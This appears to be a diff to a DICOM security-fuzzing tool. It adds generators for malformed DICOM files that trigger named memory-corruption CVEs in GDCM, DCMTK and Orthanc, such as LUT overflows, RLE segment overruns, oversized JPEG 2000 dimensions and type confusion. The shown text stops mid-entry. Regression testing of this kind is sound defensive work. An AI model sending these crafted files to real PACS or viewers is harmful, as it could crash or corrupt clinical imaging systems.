@@ -55,6 +55,22 @@ Targeted (metadata['cve']):
                       (structural trigger / regression seed, like the UAF entries)
     CVE-2026-32711  - pydicom FileSet/DICOMDIR path traversal via the
                       Referenced File ID (0004,1500); fixed in pydicom 3.0.2/2.4.5
+    CVE-2024-28130  - DCMTK dcmpstat type confusion: VOI LUT Sequence (0028,3010)
+                      emitted as a non-SQ VR (Talos TALOS-2024-1957)
+    CVE-2015-8396   - GDCM ImageRegionReader::ReadIntoBuffer integer overflow
+    CVE-2024-22373  - GDCM JPEG2000Codec::DecodeByStreamsCommon OOB write
+    CVE-2024-22391  - GDCM LookupTable::SetLUT heap overflow (palette LUT)
+    CVE-2024-25569  - GDCM RAWCodec::DecodeBytes OOB read (geometry vs pixeldata)
+    CVE-2025-48429  - GDCM RLECodec::DecodeByStreams OOB read (NumberOfSegments>15)
+    CVE-2025-52582  - GDCM Overlay::GrabOverlayFromPixelData OOB read
+    CVE-2025-11266  - GDCM encapsulated fragment/BOT integer-underflow OOB write
+    CVE-2026-5441   - Orthanc DecodePsmctRle1 (Philips PMSCT_RLE1) OOB read
+                      (structural trigger)
+    CVE-2026-5442   - Orthanc image-decoder integer overflow (dimensions as UL)
+    CVE-2026-5443   - Orthanc PALETTE COLOR width*height 32-bit multiply overflow
+    CVE-2026-5444   - Orthanc embedded-PAM image dimension overflow
+    CVE-2026-5445   - Orthanc DecodeLookupTable palette index past LUT size
+                      (Orthanc 5441..5445 are CERT/CC VU#536588, fixed in 1.12.11)
 
   Config-file CVEs exercised by the grey-box dcmqrscp track live under
   fuzz/configs/malformed/: CVE-2020-36855, CVE-2022-4981.
@@ -2616,6 +2632,637 @@ class CVEAttacks:
 
         return results
 
+    # =========================================================================
+    # GDCM codec CVEs (Cisco Talos) — crafted-.dcm pixel/codec triggers.
+    #
+    # GDCM (Grassroots DICOM) underpins a long tail of DICOM viewers and PACS,
+    # so each payload is both a faithful GDCM reproduction AND a strong probe
+    # for the same bug class in software that embeds GDCM-style codecs. The
+    # viewer CVEs that share each class (MicroDicom, Sante, MedDream — whose
+    # vendors publish no element-level root cause) are listed in
+    # metadata['related_cve'] so a DAST run against those targets is traceable
+    # without over-claiming a per-product reproduction.
+    # =========================================================================
+
+    @staticmethod
+    def _image_part10(dataset_bytes: bytes, transfer_syntax: str,
+                      sop_class: str = None) -> bytes:
+        """Wrap explicit-VR-LE dataset bytes in a Part-10 file.
+
+        The dataset is always encoded Explicit VR LE (only Pixel Data is
+        compressed under an encapsulated transfer syntax), so the meta header
+        advertises ``transfer_syntax`` while the element stream stays explicit.
+        """
+        df = DicomFile()
+        df.set_meta(
+            sop_class_uid=sop_class or SECONDARY_CAPTURE_SOP_CLASS_UID,
+            sop_instance_uid='1.2.3.4.5',
+            transfer_syntax=transfer_syntax,
+        )
+        df.dataset = dataset_bytes
+        return df.encode()
+
+    @staticmethod
+    def _ds_bytes(elements: List[Element]) -> bytes:
+        """Encode a list of Elements as an Explicit VR LE element stream."""
+        return b''.join(e.encode(implicit_vr=False, little_endian=True)
+                        for e in elements)
+
+    @staticmethod
+    def cve_2024_22391_gdcm_lut_setlut() -> List[AttackResult]:
+        """
+        CVE-2024-22391: heap buffer overflow in GDCM ``LookupTable::SetLUT``
+        (fixed in GDCM 3.0.24; TALOS-2024-1924).
+
+        SetLUT copies palette LUT data into a buffer sized from the Palette
+        Color LUT Descriptor (0028,110x) without reconciling the descriptor's
+        declared entry count / bits-per-entry against the actual LUT Data
+        (0028,120x) length. A descriptor that disagrees with its data drives an
+        out-of-bounds write. Same shape as the LUT/length-mismatch bugs in
+        GDCM-derived viewers.
+        """
+        EXPLICIT_LE = '1.2.840.10008.1.2.1'
+        results = []
+
+        # Descriptor declares 65536 entries (count field 0) at 16 bits, but the
+        # Red/Green/Blue LUT Data are only a handful of bytes → SetLUT's sized
+        # copy walks off the allocation.
+        def _lut_dataset(count_field: int, bits: int, data_len: int) -> bytes:
+            desc = struct.pack('<HHH', count_field, 0, bits)
+            lut_data = (b'\x41\x42' * data_len)[:max(data_len, 2)]
+            elems = [
+                Element(0x0028, 0x0002, 'US', 1),                # SamplesPerPixel
+                Element(0x0028, 0x0004, 'CS', 'PALETTE COLOR'),  # PhotometricInterp
+                Element(0x0028, 0x0010, 'US', 4),                # Rows
+                Element(0x0028, 0x0011, 'US', 4),                # Columns
+                Element(0x0028, 0x0100, 'US', 8),                # BitsAllocated
+                Element(0x0028, 0x0101, 'US', 8),                # BitsStored
+                Element(0x0028, 0x0102, 'US', 7),                # HighBit
+                Element(0x0028, 0x0103, 'US', 0),                # PixelRepresentation
+                Element(0x0028, 0x1101, 'US', desc),             # Red LUT Descriptor
+                Element(0x0028, 0x1102, 'US', desc),             # Green LUT Descriptor
+                Element(0x0028, 0x1103, 'US', desc),             # Blue LUT Descriptor
+                Element.raw(tag=0x00281201, vr='OW', value=lut_data),  # Red LUT Data
+                Element.raw(tag=0x00281202, vr='OW', value=lut_data),  # Green LUT Data
+                Element.raw(tag=0x00281203, vr='OW', value=lut_data),  # Blue LUT Data
+                Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 32),
+            ]
+            return CVEAttacks._ds_bytes(elems)
+
+        results.append(AttackResult(
+            name='cve_2024_22391_01_lut_descriptor_count_mismatch',
+            category='cve',
+            payload=CVEAttacks._image_part10(_lut_dataset(0x0000, 16, 4), EXPLICIT_LE),
+            description='Palette Color LUT Descriptor declares 65536 16-bit '
+                        'entries; LUT Data is 8 bytes',
+            expected_behavior='SetLUT must size the copy from the actual LUT '
+                              'Data length, not the descriptor',
+            metadata={'cve': 'CVE-2024-22391', 'library': 'GDCM',
+                      'bug_class': 'lut-bounds', 'target_func': 'LookupTable::SetLUT',
+                      'target_field': '(0028,1101) Palette Color LUT Descriptor',
+                      'related_cve': 'CVE-2024-25578'}
+        ))
+
+        # Descriptor says 8-bit entries but data is laid out for 16-bit (twice
+        # the stride) — a second, independent SetLUT sizing disagreement.
+        results.append(AttackResult(
+            name='cve_2024_22391_02_lut_bits_stride_mismatch',
+            category='cve',
+            payload=CVEAttacks._image_part10(_lut_dataset(256, 8, 1024), EXPLICIT_LE),
+            description='LUT Descriptor declares 8-bit entries; LUT Data sized '
+                        'for 16-bit entries (stride mismatch)',
+            expected_behavior='SetLUT must validate bits-per-entry against the '
+                              'data length',
+            metadata={'cve': 'CVE-2024-22391', 'library': 'GDCM',
+                      'bug_class': 'lut-bounds', 'target_func': 'LookupTable::SetLUT',
+                      'target_field': '(0028,1101) Palette Color LUT Descriptor'}
+        ))
+
+        return results
+
+    @staticmethod
+    def cve_2024_25569_gdcm_rawcodec_oob() -> List[AttackResult]:
+        """
+        CVE-2024-25569: out-of-bounds read in GDCM ``RAWCodec::DecodeBytes``
+        (fixed in GDCM 3.0.24; TALOS-2024-1944).
+
+        DecodeBytes ``memcpy``s a length derived from the image geometry
+        (Rows × Columns × BitsAllocated/8 × SamplesPerPixel) without checking it
+        against the actual Pixel Data (7FE0,0010) length, so an over-declared
+        geometry reads past the source buffer. This is the canonical
+        dimension-vs-pixeldata mismatch that the MicroDicom / Sante viewer
+        memory-corruption CVEs also fall into.
+        """
+        EXPLICIT_LE = '1.2.840.10008.1.2.1'
+        # Geometry implies 0x400 * 0x400 * 2 = 2 MiB; only 64 bytes are present.
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),                # SamplesPerPixel
+            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),    # PhotometricInterp
+            Element(0x0028, 0x0010, 'US', 0x0400),           # Rows
+            Element(0x0028, 0x0011, 'US', 0x0400),           # Columns
+            Element(0x0028, 0x0100, 'US', 16),               # BitsAllocated
+            Element(0x0028, 0x0101, 'US', 16),               # BitsStored
+            Element(0x0028, 0x0102, 'US', 15),               # HighBit
+            Element(0x0028, 0x0103, 'US', 0),                # PixelRepresentation
+            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 64),
+        ]
+        return [AttackResult(
+            name='cve_2024_25569_01_raw_geometry_exceeds_pixeldata',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
+            description='Rows×Columns×BitsAllocated imply 2 MiB but Pixel Data is '
+                        '64 bytes (RAW decode reads past the buffer)',
+            expected_behavior='RAWCodec must bound the copy by the Pixel Data '
+                              'length, not the declared geometry',
+            metadata={'cve': 'CVE-2024-25569', 'library': 'GDCM',
+                      'bug_class': 'length-mismatch',
+                      'target_func': 'RAWCodec::DecodeBytes',
+                      'target_field': '(7FE0,0010) Pixel Data vs (0028,0010/0011)',
+                      'related_cve': 'CVE-2024-22100, CVE-2025-35975, CVE-2025-36521'}
+        )]
+
+    @staticmethod
+    def cve_2025_48429_gdcm_rle_numsegments() -> List[AttackResult]:
+        """
+        CVE-2025-48429: out-of-bounds read in GDCM ``RLECodec::DecodeByStreams``
+        (GDCM 3.0.24; TALOS-2025-2214).
+
+        The RLE header is a fixed 64-byte structure: a 32-bit Number-Of-Segments
+        followed by 15 32-bit segment offsets (``Offset[15]``). DecodeByStreams
+        loops over the declared segment count and indexes ``Offset[]`` — a count
+        greater than 15 indexes past the fixed array. We declare 16+ segments.
+        """
+        RLE_LOSSLESS = '1.2.840.10008.1.2.5'
+        results = []
+
+        for n_segments in (16, 0xFFFF):
+            # RLE header: NumberOfSegments + 15 offset slots (PS3.5 Annex G).
+            header = struct.pack('<I', n_segments)
+            header += b''.join(struct.pack('<I', 64 + i * 8) for i in range(15))
+            rle_body = header + b'\x00\x80' * 32  # token + literal run filler
+            epd = EncapsulatedPixelData(transfer_syntax=RLE_LOSSLESS)
+            epd.clear_offset_table()
+            epd.add_fragment(rle_body)
+            pixel_elem = Element.raw(tag=0x7FE00010, vr='OB',
+                                     value=epd.encode(), length=0xFFFFFFFF)
+            elems = [
+                Element(0x0028, 0x0002, 'US', 1),
+                Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
+                Element(0x0028, 0x0010, 'US', 8),
+                Element(0x0028, 0x0011, 'US', 8),
+                Element(0x0028, 0x0100, 'US', 8),
+                Element(0x0028, 0x0101, 'US', 8),
+                Element(0x0028, 0x0102, 'US', 7),
+                Element(0x0028, 0x0103, 'US', 0),
+                pixel_elem,
+            ]
+            results.append(AttackResult(
+                name=f'cve_2025_48429_{n_segments:#06x}_rle_numsegments',
+                category='cve',
+                payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems),
+                                                 RLE_LOSSLESS),
+                description=f'RLE header declares {n_segments} segments; only 15 '
+                            'offset slots exist',
+                expected_behavior='RLE decoder must reject NumberOfSegments > 15',
+                metadata={'cve': 'CVE-2025-48429', 'library': 'GDCM',
+                          'bug_class': 'oob-read',
+                          'target_func': 'RLECodec::DecodeByStreams',
+                          'target_field': 'RLE header NumberOfSegments'}
+            ))
+
+        return results
+
+    @staticmethod
+    def cve_2024_22373_gdcm_jpeg2000_oob() -> List[AttackResult]:
+        """
+        CVE-2024-22373: out-of-bounds write in GDCM
+        ``JPEG2000Codec::DecodeByStreamsCommon`` (GDCM 3.0.23; fixed 3.0.24;
+        TALOS-2024-1935).
+
+        The decoder trusts the JPEG 2000 codestream's own SIZ dimensions over
+        the DICOM header's Rows/Columns. A codestream whose SIZ Xsiz/Ysiz exceed
+        the header geometry decodes more samples than the header-sized buffer
+        holds → OOB write.
+        """
+        JPEG2000 = '1.2.840.10008.1.2.4.90'  # JPEG 2000 Image Compression (Lossless)
+
+        # Minimal J2K codestream: SOC + SIZ marker with oversized Xsiz/Ysiz.
+        soc = b'\xFF\x4F'
+        # SIZ (FF51): Lsiz, Rsiz, Xsiz, Ysiz, XOsiz, YOsiz, XTsiz, YTsiz,
+        # XTOsiz, YTOsiz, Csiz, then one component (Ssiz, XRsiz, YRsiz).
+        siz_body = struct.pack('>H', 0)            # Rsiz
+        siz_body += struct.pack('>I', 0x00010000)  # Xsiz = 65536 (>> header 16)
+        siz_body += struct.pack('>I', 0x00010000)  # Ysiz = 65536
+        siz_body += struct.pack('>IIII', 0, 0, 0x00010000, 0x00010000)  # offsets/tiles
+        siz_body += struct.pack('>II', 0, 0)       # XTOsiz, YTOsiz
+        siz_body += struct.pack('>H', 1)           # Csiz = 1 component
+        siz_body += bytes([7, 1, 1])               # Ssiz(8-bit), XRsiz, YRsiz
+        siz = b'\xFF\x51' + struct.pack('>H', len(siz_body) + 2) + siz_body
+        codestream = soc + siz + b'\xFF\xD9'       # ... EOC
+
+        epd = EncapsulatedPixelData(transfer_syntax=JPEG2000)
+        epd.clear_offset_table()
+        epd.add_fragment(codestream)
+        pixel_elem = Element.raw(tag=0x7FE00010, vr='OB',
+                                 value=epd.encode(), length=0xFFFFFFFF)
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),
+            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
+            Element(0x0028, 0x0010, 'US', 16),   # header Rows  = 16
+            Element(0x0028, 0x0011, 'US', 16),   # header Cols  = 16
+            Element(0x0028, 0x0100, 'US', 8),
+            Element(0x0028, 0x0101, 'US', 8),
+            Element(0x0028, 0x0102, 'US', 7),
+            Element(0x0028, 0x0103, 'US', 0),
+            pixel_elem,
+        ]
+        return [AttackResult(
+            name='cve_2024_22373_01_jpeg2000_siz_exceeds_header',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), JPEG2000),
+            description='JPEG 2000 SIZ declares 65536×65536; DICOM header is '
+                        '16×16 (decode overruns the header-sized buffer)',
+            expected_behavior='Decoder must reconcile SIZ dimensions with the '
+                              'DICOM Rows/Columns before allocating',
+            metadata={'cve': 'CVE-2024-22373', 'library': 'GDCM',
+                      'bug_class': 'oob-write',
+                      'target_func': 'JPEG2000Codec::DecodeByStreamsCommon',
+                      'target_field': 'JPEG2000 SIZ Xsiz/Ysiz vs (0028,0010/0011)'}
+        )]
+
+    @staticmethod
+    def cve_2025_52582_gdcm_overlay_oob() -> List[AttackResult]:
+        """
+        CVE-2025-52582: out-of-bounds read in GDCM
+        ``Overlay::GrabOverlayFromPixelData`` (GDCM 3.0.24; TALOS-2025-2211).
+
+        When an overlay is embedded in the high bits of Pixel Data, GDCM walks
+        ``end = array + ovlength * 8`` from Overlay Rows/Columns (60xx,0010/0011)
+        without checking that ``ovlength`` fits the actual pixel buffer, so an
+        over-declared overlay geometry reads past the allocation.
+        """
+        EXPLICIT_LE = '1.2.840.10008.1.2.1'
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),
+            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
+            Element(0x0028, 0x0010, 'US', 8),                # Rows
+            Element(0x0028, 0x0011, 'US', 8),                # Columns
+            Element(0x0028, 0x0100, 'US', 16),               # BitsAllocated
+            Element(0x0028, 0x0101, 'US', 12),               # BitsStored
+            Element(0x0028, 0x0102, 'US', 11),               # HighBit
+            Element(0x0028, 0x0103, 'US', 0),
+            # Overlay group: dims far larger than the 8×8 pixel buffer.
+            Element(0x6000, 0x0010, 'US', 0x4000),           # Overlay Rows
+            Element(0x6000, 0x0011, 'US', 0x4000),           # Overlay Columns
+            Element(0x6000, 0x0040, 'CS', 'G'),              # Overlay Type
+            Element(0x6000, 0x0100, 'US', 1),                # Overlay Bits Allocated
+            Element(0x6000, 0x0102, 'US', 12),               # Overlay Bit Position
+            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 128),
+        ]
+        return [AttackResult(
+            name='cve_2025_52582_01_overlay_dims_exceed_pixeldata',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
+            description='Overlay-in-pixel-data declares 16384×16384 over a 128-'
+                        'byte Pixel Data buffer',
+            expected_behavior='Overlay extraction must bound by the actual Pixel '
+                              'Data length',
+            metadata={'cve': 'CVE-2025-52582', 'library': 'GDCM',
+                      'bug_class': 'oob-read',
+                      'target_func': 'Overlay::GrabOverlayFromPixelData',
+                      'target_field': '(6000,0010/0011) Overlay Rows/Columns'}
+        )]
+
+    @staticmethod
+    def cve_2025_11266_gdcm_encapsulated_fragment_underflow() -> List[AttackResult]:
+        """
+        CVE-2025-11266: out-of-bounds write in GDCM encapsulated Pixel Data
+        fragment handling (≤ 3.0.24; fixed 3.2.2).
+
+        An unsigned-integer underflow in fragment / Basic Offset Table index
+        arithmetic (a declared length/offset larger than the data, so
+        ``len - offset`` wraps to a huge value) drives a bad index. We pair an
+        oversized Basic Offset Table entry with an undersized fragment so the
+        BOT-relative arithmetic underflows.
+        """
+        JPEG_BASELINE = '1.2.840.10008.1.2.4.50'
+        epd = EncapsulatedPixelData(transfer_syntax=JPEG_BASELINE)
+        # Basic Offset Table claims a fragment at offset 0xFFFFFFF0, far past the
+        # single tiny fragment that follows → offset - actual underflows.
+        epd.set_offset_table_raw(struct.pack('<I', 0xFFFFFFF0))
+        epd.add_fragment(b'\xFF\xD8\xFF\xD9')  # 4-byte "JPEG" SOI+EOI
+        pixel_elem = Element.raw(tag=0x7FE00010, vr='OB',
+                                 value=epd.encode(), length=0xFFFFFFFF)
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),
+            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
+            Element(0x0028, 0x0010, 'US', 64),
+            Element(0x0028, 0x0011, 'US', 64),
+            Element(0x0028, 0x0100, 'US', 8),
+            Element(0x0028, 0x0101, 'US', 8),
+            Element(0x0028, 0x0102, 'US', 7),
+            Element(0x0028, 0x0103, 'US', 0),
+            pixel_elem,
+        ]
+        return [AttackResult(
+            name='cve_2025_11266_01_bot_offset_underflow',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), JPEG_BASELINE),
+            description='Basic Offset Table entry (0xFFFFFFF0) far exceeds the '
+                        '4-byte fragment, underflowing index arithmetic',
+            expected_behavior='Fragment indexing must use overflow-safe '
+                              'arithmetic and validate BOT offsets',
+            metadata={'cve': 'CVE-2025-11266', 'library': 'GDCM',
+                      'bug_class': 'integer-underflow',
+                      'target_field': 'encapsulated Basic Offset Table / fragment'}
+        )]
+
+    @staticmethod
+    def cve_2015_8396_gdcm_imageregionreader_int_overflow() -> List[AttackResult]:
+        """
+        CVE-2015-8396: integer overflow in GDCM
+        ``ImageRegionReader::ReadIntoBuffer`` (fixed in GDCM 2.6.2).
+
+        The buffer size is computed from the image geometry; geometry whose
+        product overflows 32-bit arithmetic yields an undersized allocation that
+        is then overrun. Set Rows × Columns × SamplesPerPixel × BitsAllocated/8
+        to wrap past 2^32.
+        """
+        EXPLICIT_LE = '1.2.840.10008.1.2.1'
+        elems = [
+            Element(0x0028, 0x0002, 'US', 3),                # SamplesPerPixel = 3
+            Element(0x0028, 0x0004, 'CS', 'RGB'),
+            Element(0x0028, 0x0010, 'US', 0xFFFF),           # Rows
+            Element(0x0028, 0x0011, 'US', 0xFFFF),           # Columns
+            Element(0x0028, 0x0100, 'US', 16),               # BitsAllocated
+            Element(0x0028, 0x0101, 'US', 16),
+            Element(0x0028, 0x0102, 'US', 15),
+            Element(0x0028, 0x0103, 'US', 0),
+            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 64),
+        ]
+        return [AttackResult(
+            name='cve_2015_8396_01_geometry_size_overflow',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
+            description='65535×65535×3×2 byte geometry overflows 32-bit size '
+                        'arithmetic',
+            expected_behavior='Buffer sizing must use overflow-checked arithmetic',
+            metadata={'cve': 'CVE-2015-8396', 'library': 'GDCM',
+                      'bug_class': 'integer-overflow',
+                      'target_func': 'ImageRegionReader::ReadIntoBuffer',
+                      'target_field': '(0028,0010/0011) Rows/Columns'}
+        )]
+
+    # -------------------------------------------------------------------------
+    # CVE-2024-28130: DCMTK type confusion in dcmpstat softcopy VOI LUT
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2024_28130_dcmtk_voi_lut_type_confusion() -> List[AttackResult]:
+        """
+        CVE-2024-28130: incorrect type conversion in DCMTK
+        ``DVPSSoftcopyVOI_PList::createFromImage`` (dcmpstat, 3.6.8;
+        TALOS-2024-1957).
+
+        The code unconditionally casts the VOI LUT Sequence (0028,3010) element
+        to ``DcmSequenceOfItems*``. A file that encodes (0028,3010) with a
+        non-sequence VR (e.g. a byte string) makes the cast operate on the wrong
+        object type → memory corruption / potential RCE. Faithful trigger:
+        emit (0028,3010) as ``LO``/``UN`` rather than ``SQ``.
+        """
+        EXPLICIT_LE = '1.2.840.10008.1.2.1'
+        results = []
+
+        for vr, name, blob in (
+            (b'LO', 'lo_string', b'NOT_A_SEQUENCE_OBJECT'),
+            (b'UN', 'un_bytes', b'\x00' * 16),
+        ):
+            elems = [
+                Element(0x0028, 0x0002, 'US', 1),
+                Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
+                Element(0x0028, 0x0010, 'US', 4),
+                Element(0x0028, 0x0011, 'US', 4),
+                Element(0x0028, 0x0100, 'US', 16),
+                Element(0x0028, 0x0101, 'US', 16),
+                Element(0x0028, 0x0102, 'US', 15),
+                Element(0x0028, 0x0103, 'US', 0),
+                # VOI LUT Sequence as a non-SQ VR — the type-confusion trigger.
+                Element.raw(tag=0x00283010, vr=vr, value=blob),
+                Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 32),
+            ]
+            results.append(AttackResult(
+                name=f'cve_2024_28130_{name}_voi_lut_not_sequence',
+                category='cve',
+                payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems),
+                                                 EXPLICIT_LE),
+                description=f'VOI LUT Sequence (0028,3010) encoded as {vr.decode()} '
+                            'instead of SQ',
+                expected_behavior='dcmpstat must type-check (0028,3010) before '
+                                  'casting to a sequence',
+                metadata={'cve': 'CVE-2024-28130', 'product': 'DCMTK',
+                          'bug_class': 'type-confusion',
+                          'target_func': 'DVPSSoftcopyVOI_PList::createFromImage',
+                          'target_field': '(0028,3010) VOI LUT Sequence'}
+            ))
+
+        return results
+
+    # -------------------------------------------------------------------------
+    # CVE-2026-5441..5445: Orthanc image-decoder batch (CERT/CC VU#536588)
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2026_5441_5445_orthanc_image_decoder() -> List[AttackResult]:
+        """
+        Orthanc ``DicomImageDecoder`` batch, CERT/CC VU#536588, fixed in 1.12.11.
+
+        The crafted-DICOM members of the CVE-2026-5437..5445 batch that live in
+        Orthanc's image pipeline (the meta-header OOB CVE-2026-5437 is handled
+        by :meth:`cve_2026_5437_meta_header_oob`; the gzip/zip/Content-Length
+        DoS members 5438/5439/5440 are HTTP-layer and out of scope for a DICOM
+        payload):
+
+          * CVE-2026-5441 — ``DecodePsmctRle1`` (Philips PMSCT_RLE1) OOB read
+          * CVE-2026-5442 — frame-size integer overflow when dimensions arrive
+            as ``UL`` instead of ``US`` → heap overflow
+          * CVE-2026-5443 — PALETTE COLOR width×height 32-bit multiply overflow
+          * CVE-2026-5444 — embedded PAM image dimension arithmetic overflow
+          * CVE-2026-5445 — ``DecodeLookupTable`` palette index past LUT size
+        """
+        EXPLICIT_LE = '1.2.840.10008.1.2.1'
+        results = []
+
+        # CVE-2026-5442: Rows/Columns delivered with VR UL (4-byte) instead of
+        # the expected US (2-byte). A decoder that reads them as 32-bit and
+        # multiplies into a frame size overflows. 0x00010001 reads as a huge US
+        # pair / wrong-width value.
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),
+            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
+            Element.raw(tag=0x00280010, vr='UL', value=struct.pack('<I', 0x00010001)),  # Rows as UL
+            Element.raw(tag=0x00280011, vr='UL', value=struct.pack('<I', 0x00010001)),  # Columns as UL
+            Element(0x0028, 0x0100, 'US', 16),
+            Element(0x0028, 0x0101, 'US', 16),
+            Element(0x0028, 0x0102, 'US', 15),
+            Element(0x0028, 0x0103, 'US', 0),
+            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 64),
+        ]
+        results.append(AttackResult(
+            name='cve_2026_5442_01_dimensions_as_ul',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
+            description='Rows/Columns encoded as UL (0x00010001) instead of US, '
+                        'overflowing frame-size arithmetic',
+            expected_behavior='Decoder must validate Rows/Columns VR and bound '
+                              'the frame-size product',
+            metadata={'cve': 'CVE-2026-5442', 'product': 'Orthanc',
+                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'integer-overflow',
+                      'target_field': '(0028,0010/0011) Rows/Columns VR UL'}
+        ))
+
+        # CVE-2026-5443: PALETTE COLOR with oversized Rows×Columns whose 32-bit
+        # product wraps, bypassing the size validation before allocation.
+        desc = struct.pack('<HHH', 0, 0, 8)
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),
+            Element(0x0028, 0x0004, 'CS', 'PALETTE COLOR'),
+            Element(0x0028, 0x0010, 'US', 0x8000),           # Rows
+            Element(0x0028, 0x0011, 'US', 0x8000),           # Columns (0x8000^2*... wraps)
+            Element(0x0028, 0x0100, 'US', 8),
+            Element(0x0028, 0x0101, 'US', 8),
+            Element(0x0028, 0x0102, 'US', 7),
+            Element(0x0028, 0x0103, 'US', 0),
+            Element(0x0028, 0x1101, 'US', desc),
+            Element(0x0028, 0x1102, 'US', desc),
+            Element(0x0028, 0x1103, 'US', desc),
+            Element.raw(tag=0x00281201, vr='OW', value=b'\x00' * 16),
+            Element.raw(tag=0x00281202, vr='OW', value=b'\x00' * 16),
+            Element.raw(tag=0x00281203, vr='OW', value=b'\x00' * 16),
+            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 64),
+        ]
+        results.append(AttackResult(
+            name='cve_2026_5443_01_palette_color_dim_overflow',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
+            description='PALETTE COLOR 32768×32768 whose 32-bit pixel-count '
+                        'product overflows the size check',
+            expected_behavior='PALETTE COLOR sizing must use overflow-checked '
+                              'arithmetic',
+            metadata={'cve': 'CVE-2026-5443', 'product': 'Orthanc',
+                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'integer-overflow',
+                      'target_field': '(0028,0010/0011) PALETTE COLOR dimensions'}
+        ))
+
+        # CVE-2026-5445: PALETTE COLOR pixel indices larger than the LUT size —
+        # a small LUT (16 entries) with pixel values up to 255 indexes past the
+        # table in DecodeLookupTable.
+        desc16 = struct.pack('<HHH', 16, 0, 8)
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),
+            Element(0x0028, 0x0004, 'CS', 'PALETTE COLOR'),
+            Element(0x0028, 0x0010, 'US', 4),
+            Element(0x0028, 0x0011, 'US', 4),
+            Element(0x0028, 0x0100, 'US', 8),
+            Element(0x0028, 0x0101, 'US', 8),
+            Element(0x0028, 0x0102, 'US', 7),
+            Element(0x0028, 0x0103, 'US', 0),
+            Element(0x0028, 0x1101, 'US', desc16),
+            Element(0x0028, 0x1102, 'US', desc16),
+            Element(0x0028, 0x1103, 'US', desc16),
+            Element.raw(tag=0x00281201, vr='OW', value=b'\x00' * 32),
+            Element.raw(tag=0x00281202, vr='OW', value=b'\x00' * 32),
+            Element.raw(tag=0x00281203, vr='OW', value=b'\x00' * 32),
+            # Pixel values 0xFF index well past a 16-entry LUT.
+            Element.raw(tag=0x7FE00010, vr='OW', value=b'\xFF' * 16),
+        ]
+        results.append(AttackResult(
+            name='cve_2026_5445_01_palette_index_past_lut',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
+            description='PALETTE COLOR pixel indices (0xFF) exceed the 16-entry '
+                        'palette LUT',
+            expected_behavior='DecodeLookupTable must clamp/validate indices '
+                              'against the LUT length',
+            metadata={'cve': 'CVE-2026-5445', 'product': 'Orthanc',
+                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'oob-read',
+                      'target_func': 'DicomImageDecoder::DecodeLookupTable',
+                      'target_field': '(7FE0,0010) palette index vs LUT size'}
+        ))
+
+        # CVE-2026-5444: embedded PAM (Netpbm) image whose WIDTH/HEIGHT header
+        # overflows buffer-size arithmetic during decode.
+        pam = (b'P7\n'
+               b'WIDTH 4294967295\n'
+               b'HEIGHT 4294967295\n'
+               b'DEPTH 1\n'
+               b'MAXVAL 255\n'
+               b'TUPLTYPE GRAYSCALE\n'
+               b'ENDHDR\n') + b'\x00' * 16
+        epd = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
+        epd.clear_offset_table()
+        epd.add_fragment(pam)
+        pixel_elem = Element.raw(tag=0x7FE00010, vr='OB',
+                                 value=epd.encode(), length=0xFFFFFFFF)
+        elems = [
+            Element(0x0028, 0x0002, 'US', 1),
+            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
+            Element(0x0028, 0x0010, 'US', 4),
+            Element(0x0028, 0x0011, 'US', 4),
+            Element(0x0028, 0x0100, 'US', 8),
+            Element(0x0028, 0x0101, 'US', 8),
+            Element(0x0028, 0x0102, 'US', 7),
+            Element(0x0028, 0x0103, 'US', 0),
+            pixel_elem,
+        ]
+        results.append(AttackResult(
+            name='cve_2026_5444_01_embedded_pam_dim_overflow',
+            category='cve',
+            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems),
+                                             '1.2.840.10008.1.2.4.50'),
+            description='Embedded PAM image declares WIDTH/HEIGHT 0xFFFFFFFF, '
+                        'overflowing decode size arithmetic',
+            expected_behavior='PAM decode must bound WIDTH×HEIGHT before '
+                              'allocation',
+            metadata={'cve': 'CVE-2026-5444', 'product': 'Orthanc',
+                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'integer-overflow',
